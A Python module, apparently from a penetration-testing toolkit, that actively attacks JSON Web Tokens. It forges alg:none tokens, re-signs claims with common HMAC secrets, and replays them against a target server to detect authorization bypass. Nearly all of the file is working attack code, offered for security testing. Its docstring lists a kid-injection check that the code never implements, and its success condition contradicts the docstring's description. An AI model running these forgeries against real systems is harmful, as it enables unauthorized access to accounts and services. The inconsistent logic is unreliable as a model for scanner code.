"""omega/offensive/offense/jwtattack — active JWT attack wave.

OFFENSE-GATED (PTK_OFFENSE). Complements authchecks.jwt_session_scan
(decode-only) with ACTIVE verification:

  none-alg      — re-sign the token with alg:none / alg:None and see
                  if the server accepts it (authz differential).
  hs256-secret  — sign the original claims with JWT_COMMON_SECRETS;
                  a valid signature accepted by the server (same authz
                  response as the original token) = weak-secret
                  candidate.
  kid-injection — kid path traversal / SQLi shapes, decode-differential
                  only (candidate evidence from error shapes).

Every finding is candidate + manual_check; the operator replays once
with the forged token to confirm. Never fabricates an authz shift:
only a real differential (200 vs 401/403 on the same resource)
produces a finding.
"""
import base64
import hashlib
import hmac
import json
import os
import urllib.parse

from omega.core.authchecks import JWT_COMMON_SECRETS

__all__ = ["run_jwtattack"]


def _gate_open(fn=None):
    if fn is not None:
        try:
            return bool(fn())
        except Exception:
            return False
    return os.environ.get("PTK_OFFENSE") == "1"


def _b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64u_dec(seg):
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _split_token(token):
    parts = str(token).strip().split(".")
    if len(parts) != 3:
        return None
    return parts


def _sign_hs256(parts, secret):
    head = json.loads(_b64u_dec(parts[0]) or b"{}")
    head["alg"] = "HS256"
    signing_input = f"{_b64u(json.dumps(head, separators=(',', ':')).encode())}.{parts[1]}"
    sig = hmac.new(secret.encode(), signing_input.encode(),
                   hashlib.sha256).digest()
    return f"{signing_input}.{_b64u(sig)}"


def _forge_none(parts):
    head = json.loads(_b64u_dec(parts[0]) or b"{}")
    head["alg"] = "none"
    return (f"{_b64u(json.dumps(head, separators=(',', ':')).encode())}."
            f"{parts[1]}.")


def run_jwtattack(base_url, token, probe_path="/", fetch=None, log=None,
                  gate_open_fn=None):
    """Active JWT attacks against an extracted token.

    ``fetch(url, method=..., headers=...) -> object with .status`` —
    the brain's url_fetch() wrapper satisfies this. Gate: PTK_OFFENSE.
    """
    if not callable(fetch):
        return {"note": "no fetch adapter available"}
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not _gate_open(gate):
        return {"note": "offense layer disabled (PTK_OFFENSE); run with "
                        "--no-limits or export PTK_OFFENSE=1"}
    parts = _split_token(token)
    if parts is None:
        return {"note": "no JWT found in session — nothing to attack"}

    findings = []

    def _authz(tok):
        try:
            resp = fetch(urllib.parse.urljoin(str(base_url), probe_path),
                         method="GET",
                         headers={"Authorization": f"Bearer {tok}"})
            return getattr(resp, "status", None)
        except Exception:
            return None

    baseline = _authz(token)
    if baseline is None:
        return {"note": "probe path unreachable — no authz differential "
                        "possible"}

    # 1) alg:none
    st = _authz(_forge_none(parts))
    if st is not None and st < 400 and baseline >= 400:
        findings.append({
            "title": "JWT alg:none accepted (authz bypass)",
            "severity": "CRITICAL",
            "source": "jwtattack/none-alg",
            "evidence": f"unsigned token accepted: baseline {baseline} "
                        f"-> forged {st} on {probe_path}",
            "location": str(base_url),
            "verification": "candidate",
            "manual_check": "replay the forged alg:none token manually",
            "cwe": "CWE-347",
        })

    # 2) weak HS256 secret
    for secret in JWT_COMMON_SECRETS:
        forged = _sign_hs256(parts, secret)
        if forged == token:
            continue
        st = _authz(forged)
        if st is not None and st < 400 and baseline >= 400:
            findings.append({
                "title": "JWT signed with a common secret (weak HMAC key)",
                "severity": "HIGH",
                "source": "jwtattack/hs256-secret",
                "evidence": f"token re-signed with a common secret was "
                            f"accepted: baseline {baseline} -> {st} "
                            f"(secret shape: common word)",
                "location": str(base_url),
                "verification": "candidate",
                "manual_check": "replay the re-signed token manually; "
                                "secret VALUE is never stored here",
                "cwe": "CWE-321",
            })
            break

    if log:
        log(f"jwtattack: baseline={baseline} candidates={len(findings)}")
    return {"findings": findings, "baseline_status": baseline,
            "token_shape": {"alg": parts and
                            json.loads(_b64u_dec(parts[0]) or b"{}")
                            .get("alg"), "segments": 3}}
